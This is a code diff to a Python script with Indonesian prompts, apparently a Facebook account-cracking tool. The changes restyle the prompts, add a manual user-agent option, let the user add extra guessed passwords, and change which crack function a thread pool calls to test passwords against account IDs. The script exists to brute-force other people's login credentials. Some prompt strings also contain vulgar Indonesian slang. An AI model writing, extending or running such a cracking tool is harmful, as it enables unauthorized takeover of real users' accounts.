@@ -1224,26 +1224,35 @@ def setting():
 	elif hc in ['4','04']:
 		method.append('mbasic')
 	else:
-		method.append('mobile')
+		method.append('mbasic')
 	print('')
-	_jembot_ = input('>> Tambahkan Aplikasi Terkait ( Y/t ) ')
+	_jembot_ = input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mTambahkan Aplikasi Terkait ? \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mt \33[m) ')
 	if _jembot_ in ['']:
-		print('>> Pilih Yang Bener Kontol ')
+		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih Yang Bener Kak ! ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+	pwplus=input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mTambahkan Password Manual ? \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mt \33[m) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
-		pwku=input('>> Masukkan Password Tambahan : ')
+		pwku=input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mMasukkan Password Tambahan : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
+		
+	print(f'\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mApakah Anda Ingin Mengunakan User-Agent Manual ? \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mT \33[m)')
+	uatambah = input(f'\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih > \x1b[1;93m')
+	if uatambah in ['y','Ya','ya','Y']:
+		ualuh.append('ya')
+		bzer = input(f'\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mMasukan User-Agent > \x1b[1;93m')
+		ualu.append(bzer)
+	else:
+		ualuh.append('tidak')
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
@@ -1285,7 +1294,7 @@ def passwrd():
 			elif 'mbasic' in method:
 				pool.submit(crackmbasic,idf,pwv)
 			else:
-				pool.submit(crackmbasic,idf,pwv)
+				pool.submit(crack,idf,pwv)
 	print('')
 	cetak(nel('\t[cyan]>>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] <<[white] '))
 	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
